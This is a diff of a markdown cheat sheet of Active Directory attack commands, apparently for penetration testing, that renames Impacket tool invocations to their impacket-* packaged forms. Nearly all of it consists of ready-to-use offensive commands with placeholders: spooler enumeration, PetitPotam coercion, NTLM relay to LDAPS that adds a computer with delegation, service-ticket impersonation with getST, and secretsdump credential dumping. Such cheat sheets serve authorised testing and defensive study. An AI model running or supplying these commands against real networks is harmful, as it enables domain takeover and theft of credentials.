@@ -5,13 +5,13 @@
 ## Finding Spooler services listening
 #plateform/linux  #target/remote #cat/RECON 
 ```
-rpcdump.py <domain>/<user>:'<password>'@<dc> | grep MS-RPRN
+impacket-rpcdump <domain>/<user>:'<password>'@<dc> | grep MS-RPRN
 ```
 
 ## Finding Spooler services anonymous
 #plateform/linux  #target/remote #cat/RECON 
 ```
-rpcdump.py <dc> | grep -A 6 MS-RPRN
+impacket-rpcdump <dc> | grep -A 6 MS-RPRN
 ```
 
 ## dementor
@@ -44,22 +44,22 @@ https://github.com/topotam/PetitPotam
 PetitPotam.py -u <user> -p '<password>' -d <domain> <listener> <target>
 ```
 
-## ntlmrelayx add computer
+## impacket-ntlmrelayx add computer
 #plateform/linux  #target/remote #cat/ATTACK/MITM 
 ```
-ntlmrelayx -t ldaps://<dc1> -smb2support --remove-mic --add-computer <computer_name> <computer_password> --delegate-access
+impacket-ntlmrelayx -t ldaps://<dc1> -smb2support --remove-mic --add-computer <computer_name> <computer_password> --delegate-access
 ```
 
 ## use silver ticket
 #plateform/linux  #target/remote #cat/ATTACK/EXPLOIT 
 ```
-getST.py -spn host/<dc2> -impersonate <user_to_impersonate> -dc-ip <dc1_ip> '<domain>/<computer_name>$:<computer_password>'
+impacket-getST -spn host/<dc2> -impersonate <user_to_impersonate> -dc-ip <dc1_ip> '<domain>/<computer_name>$:<computer_password>'
 ```
 
 ## secret dump with kerberos
 #plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-secretsdump -k <dc>
+impacket-secretsdump -k <dc>
 ```
 
 ## PrintNightmare
